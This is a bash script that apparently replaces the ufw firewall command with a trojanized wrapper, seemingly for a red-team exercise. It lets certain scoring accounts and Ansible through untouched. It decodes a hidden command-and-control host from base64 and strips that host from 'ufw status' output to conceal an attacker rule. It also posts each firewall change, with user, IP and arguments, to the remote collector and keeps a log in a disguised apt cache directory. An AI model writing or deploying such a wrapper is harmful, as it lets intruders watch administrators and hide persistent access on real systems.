#!/bin/bash
REAL_UFW="/usr/sbin/ufw"

# Pass straight through for gray team scoring accounts
case "$(whoami)" in
    kingneptune|paintythepirate|greyteamadmin) exec $REAL_UFW "$@" ;;
esac

# Ansible automation bypass — let Ansible run unimpeded
if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
    exec $REAL_UFW "$@"
fi

LOG_DIR="/var/lib/apt/lists/.cache"
LOCAL_LOG="${LOG_DIR}/events"
C2_HOST=$(printf "%s" "__ENC__" | base64 -d)
C2_PORT="9001"
COLLECT_URL="http://${C2_HOST}:${C2_PORT}/log"

_log_local() {
    touch "$LOCAL_LOG" 2>/dev/null
    echo "$1" >> "$LOCAL_LOG" 2>/dev/null
    true
}

_log_remote() {
    curl -sf -X POST -H "Content-Type: application/json" \
        -d "$1" --connect-timeout 3 --max-time 3 \
        "$COLLECT_URL" > /dev/null 2>&1 &
    true
}

INVOKING_USER=$(whoami)
HOST_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
HOST_TS=$(date -u "+%Y-%m-%dT%H:%M:%SZ")
COMMAND_ARGS="$*"

INTERESTING="enable|disable|allow|deny|reject|delete|reset|limit"

ACTION=""
for arg in "$@"; do
    case "$arg" in
        --*) ;;
        -*)  ;;
        *) [ -z "$ACTION" ] && ACTION="$arg" ;;
    esac
done

# For status/show operations, filter our rule from output
IS_STATUS=0
case "$ACTION" in
    status|show) IS_STATUS=1 ;;
esac

if [ "$IS_STATUS" -eq 1 ]; then
    $REAL_UFW "$@" 2>&1 | grep -v "$C2_HOST"
    exit ${PIPESTATUS[0]}
fi

$REAL_UFW "$@"
RC=$?

if echo "$ACTION" | grep -qE "^(${INTERESTING})$"; then
    PAYLOAD=$(printf '{"host_ip":"%s","user":"%s","event_type":"ufw","timestamp":"%s","data":{"action":"%s","args":"%s","exit_code":%d}}' \
        "$HOST_IP" "$INVOKING_USER" "$HOST_TS" "$ACTION" "$COMMAND_ARGS" "$RC")
    _log_remote "$PAYLOAD"
    _log_local "${HOST_TS}|ufw|${INVOKING_USER}|${ACTION}|${COMMAND_ARGS}|rc:${RC}"
fi

exit $RC
